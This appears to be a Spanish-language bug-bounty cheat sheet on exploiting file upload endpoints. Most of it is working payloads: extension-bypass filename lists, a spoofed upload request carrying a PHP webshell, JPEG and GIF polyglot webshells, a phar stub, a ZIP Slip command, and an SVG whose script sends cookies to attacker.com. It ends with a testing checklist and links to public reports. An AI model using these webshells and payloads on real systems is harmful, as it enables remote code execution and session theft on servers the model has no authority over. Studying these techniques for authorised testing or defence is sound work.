---
title: "File Upload — Bypass y RCE"
description: "Las vulnerabilidades de subida de archivos son de las más impactantes."
category: "Web"
date: 2026-07-18
---
# 📁 File Upload — Bypass y RCE

Las vulnerabilidades de subida de archivos son de las más impactantes. El objetivo máximo es **RCE via webshell**, pero el espectro es amplio: XSS almacenado via SVG, XXE via DOCX, path traversal via ZIP, polyglots.

## Árbol de ataque

```
File Upload Endpoint
  ├── ¿Qué valida el servidor?
  │   ├── Solo extensión → Bypass: doble ext, null byte, case
  │   ├── Solo Content-Type → Cambiar header
  │   ├── Solo magic bytes → Prepender bytes mágicos
  │   └── Extensión + Content-Type + Magic → Polyglot
  └── ¿Dónde cae el archivo?
      ├── Webroot ejecutable → RCE via webshell
      ├── Servido a usuarios → XSS via SVG/HTML
      └── Procesado por parser → XXE via DOCX/SVG
```

## Bypass de extensión

```
# Double extension
shell.php.jpg  shell.php.png  shell.asp;.jpg

# Null byte (PHP/C legacy)
shell.php%00.jpg  shell.php\x00.jpg

# Case sensitivity
shell.PHP  shell.pHp  shell.Php

# Extensiones alternativas
shell.phtml  shell.pht  shell.php3  shell.php4  shell.php5
shell.shtml  shell.shtm  shell.asp  shell.asa  shell.ashx
shell.asmx  shell.aspx  shell.jsp  shell.jspx

# .htaccess override
AddType application/x-httpd-php .jpg
```

## Content-Type manipulation

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary
------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg          # ← Mentira
<?php system($_GET['cmd']); ?>
------Boundary--
```

## Magic bytes

```
JPEG:  \xFF\xD8\xFF\xE0
PNG:   \x89\x50\x4E\x47
GIF:   GIF89a
PDF:   %PDF
ZIP:   PK\x03\x04
```

```bash
# Polyglot PHP + JPEG
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.php
```

## Polyglots avanzados

### GIF + PHP (no requiere magic byte check)

```
GIF89a<?php system($_GET['cmd']); ?>
```

### Phar deserialization

```php
// Crea un phar polyglot
<?php
$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');
$phar->setMetadata(['user' => 'admin']);
$phar->stopBuffering();
?>
```

## RCE vía ZIP Slip (path traversal en archivos)

```bash
# Crear ZIP con path traversal
zip exploit.zip ../../var/www/html/shell.php
```

## XSS via SVG

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.location='https://attacker.com/steal?c='+document.cookie</script>
</svg>
```

## XXE via DOCX

```bash
# DOCX es un ZIP con XML adentro
unzip document.docx -d docx_extracted/
# Inyectar XXE en word/document.xml
zip -r malicious.docx docx_extracted/
```

## Herramientas

| Herramienta | Uso |
|-------------|-----|
| Burp Upload Scanner | Extensión BApp para test automatizado |
| `upload_bypass` | Tool que prueba 20+ técnicas |
| `exif_imagetype` bypass | Enumera qué acepta el servidor |

## Reports públicos

- [File upload to RCE via ImageMagick - $3,500](https://hackerone.com/reports/350705)
- [Webshell upload bypass via Content-Type - Shopify](https://hackerone.com/reports/1120307)
- [RCE via file upload + path traversal - GitLab](https://hackerone.com/reports/1667751)
- [Unrestricted upload via .htaccess - Valve](https://hackerone.com/reports/1154542)
- [CVE-2025-23211: Tandoor Recipes Jinja2 SSTI via file upload](https://www.offsec.com/blog/cve-2025-23211/)

## Checklist de prueba

- [ ] Extensiones directas (.php, .asp, .jsp)
- [ ] Double extension (.php.jpg)
- [ ] Case swapping (.PHP)
- [ ] Null byte (.php%00.jpg)
- [ ] Content-Type spoofing
- [ ] Magic byte prepend
- [ ] Polyglot (GIF+PHP, JPEG+PHP)
- [ ] SVG XSS
- [ ] DOCX XXE
- [ ] ZIP Slip (path traversal)
- [ ] .htaccess override
- [ ] Phar deserialization

## Relacionado
- **LFI RFI Path Traversal** — phar:// deserialization, Zip Slip
- **Race Conditions** — upload race antes de verificación
- **SSRF** — SVG XXE → SSRF, import remoto
- **SSTI** — PHP upload + SSTI chain
- **XSS y bypass CSP** — SVG XSS almacenado
- **XXE** — DOCX/XLSX XXE via upload
- **Anti-Forense y PoCs de Vulnerabilidades**
- **Claude-BugHunter** (skill `hunt-file-upload`)
